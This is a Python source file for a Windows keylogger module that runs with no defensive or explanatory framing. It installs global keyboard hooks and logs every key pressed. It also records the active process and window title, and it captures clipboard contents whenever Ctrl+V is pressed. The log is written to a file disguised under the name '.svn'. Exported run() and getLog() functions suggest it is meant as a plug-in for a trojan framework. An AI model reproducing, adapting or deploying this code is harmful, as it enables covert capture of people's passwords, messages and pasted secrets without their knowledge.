from ctypes import *
import pythoncom
## pip install C:\Users\Administrator\Downloads\pyHook-1.5.1-cp36-cp36m-win_amd64.whl
#import pyHook
from pyhooked import Hook, KeyboardEvent, MouseEvent
import win32clipboard

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
currentWindow = None
currentKey = None

logFile = "d:/.svn"

def getCurrentProcess() :
    global currentWindow
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    
    # store the current process ID
    processId = "%d" % pid.value
    
    # grab the executable
    executable = create_string_buffer(("\x00" * 512).encode("UTF-8"))
    hProcess = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
    
    # now read its title
    windowTitle = create_string_buffer(("\x00" * 512).encode("UTF-8"))
    length = user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
    
    if currentWindow != windowTitle.value :
        # print out the header if we're in the right process
        with open(logFile,"w") as output :
            print("", file=output)
            print("[ PID: %s - %s - %s ]" % (processId, executable.value, windowTitle.value), file=output)
            print("", file=output)
        currentWindow = windowTitle.value
    
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(hProcess)

def strInList(target, strList) :
    result = False
    for strs in strList :
        if target in strs :
            return True
    return result

def processOneKeyEvent(args):
    global currentKey
    if (args.event_type == "key down") :
        #currentKey = args.current_key
    #else :
        #if (currentKey == args.current_key) :
            with open(logFile,"w") as output :
                print(args.current_key, file=output)
                
def processCombineKeyEvent(args):
    if (len(args.pressed_key) == 2) and strInList("control", args.pressed_key) :
        # if [CTRL-V], get the value on the clipboard
        if strInList("V", args.pressed_key) :
            win32clipboard.OpenClipboard()
            pastedValue = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            with open(logFile,"w") as output :
                print("[PASTE] - %s" %(pastedValue), file=output)

def keyStroke(args):
    global currentWindow
    global currentKey

    getCurrentProcess()

    if isinstance(args, KeyboardEvent) :
        processOneKeyEvent(args)
        processCombineKeyEvent(args)
    if isinstance(args, MouseEvent):
        pass
    return True

def getLog() :
    return logFile

def run(**kwargs) :
    hk = Hook()  # make a new instance of PyHooked
    hk.handler = keyStroke  # add a new shortcut ctrl+a, or triggered on mouseover of (300,400)
    hk.hook()  # hook into the events, and listen to the presses
